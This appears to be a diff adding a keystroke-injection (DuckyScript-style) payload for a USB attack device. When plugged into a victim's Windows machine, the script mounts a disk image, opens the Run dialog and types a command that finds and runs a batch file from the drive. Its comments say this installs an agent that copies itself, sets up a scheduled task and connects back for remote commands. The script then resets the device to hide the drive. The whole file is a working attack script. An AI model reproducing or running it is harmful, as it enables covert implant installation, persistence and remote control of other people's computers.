@@ -1,0 +1,54 @@
+REM To run this you first need to create a disk image which contains the agent
+REM Follow tools/README.md for instructions
+REM Make sure the disk image is named agent.img you put it on the SD card
+
+SERIAL 115200
+WEB_ON
+
+DEFINE #FILE /agentInstalled
+
+IF (FILE_EXISTS() == FALSE) THEN
+  USB_MOUNT_DISK_READ_ONLY /agent.img
+
+  WAIT_FOR_USB_STORAGE_ACTIVITY
+
+  REM Searches each drive for a file name in1.bat. Runs it if found
+
+  REM If your payload needs some special chars, you might need to know the language pack of the victim machine
+  REM Support for language switching right now isn't complete but we can work around it by injecting raw keypresses
+  REM RAW_HID SHIFT 0x64 as an example
+  REM RAW_HID 0x64
+
+  REM Open Run window
+  GUI R
+  DELAY 1000
+
+  REM The interpreter injects some 'constants' like #_VID_ and #_PID_.
+  REM This is to keep compatibility with DuckyScript3 but allows us to have dynamic variables
+  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:
+  RAW_HID 0x64
+  STRING in1.bat %d:
+  RAW_HID 0x64
+  STRING in1.bat #_VID_ #_PID_
+  ENTER
+
+  REM Wait a bit for the script to run and then for the copy to finish
+  DELAY 1000
+  WAIT_FOR_USB_STORAGE_ACTIVITY_TO_STOP
+  REM Wait a bit of time for the scheduled task to be created
+  DELAY 1000
+
+  REM At this point the agent will copy itself somewhere safe and rerun itself
+  REM we can wait until it connects
+
+  CREATE_FILE()
+
+  REM By resetting we can make the USB drive go away
+  RESET
+END_IF
+
+WHILE (AGENT_CONNECTED() == FALSE)
+  DELAY 2000
+END_WHILE
+
+AGENT_RUN dir
